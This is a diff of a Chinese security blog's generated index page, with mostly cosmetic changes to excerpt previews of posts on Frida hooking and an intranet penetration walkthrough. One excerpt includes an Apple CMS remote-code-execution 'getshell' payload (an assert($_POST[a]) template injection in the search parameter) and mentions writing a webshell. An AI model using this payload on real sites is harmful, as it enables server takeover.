@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
+<meta name="generator" content="Hexo 5.4.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -495,11 +495,9 @@
                             <div class="summary block-with-text">
                                 
                                     string.trim这个还是比较关键的，没准可以从这里得到加密方式，或者挖到sql注入，文件上传等漏洞。进一步利用可以打印堆栈来用
-Java.perform(function(){
+Java.perform(function()&amp;#123;
 
-    function showStack(){
-
-
+    function showS
                                 
                             </div>
                             <div class="publish-info">
@@ -519,6 +517,12 @@ Java.perform(function(){
                             </div>
                         </div>
 
+                        
+                        <div class="card-action article-tags">
+                            
+                            <a href="/tags/app%E5%AE%89%E5%85%A8/"><span class="chip bg-color">app安全</span></a>
+                            
+                        </div>
                         
                     </div>
                 </div>
@@ -556,9 +560,7 @@ Java.perform(function(){
 原理呢其实就是hook监控了一些加密库会调用到的底层函数。
 先贴代码：
 
-Java.perform(function () {
-
-    fu
+Java.perform(function () &amp;#123
                                 
                             </div>
                             <div class="publish-info">
@@ -863,8 +865,7 @@ Java.perform(function () {
                                     linux内网1苹果cms：
 有个rce的洞：
 getshell payload（a）:
-index.php?m=vod-search&amp;wd={if-A:assert($_POST[a])}{endif-A}
-fput写马，test
+index.php?m=vod-search&amp;wd=&amp;#123;if-A:assert($_POST[a])&amp;#125;&am
                                 
                             </div>
                             <div class="publish-info">
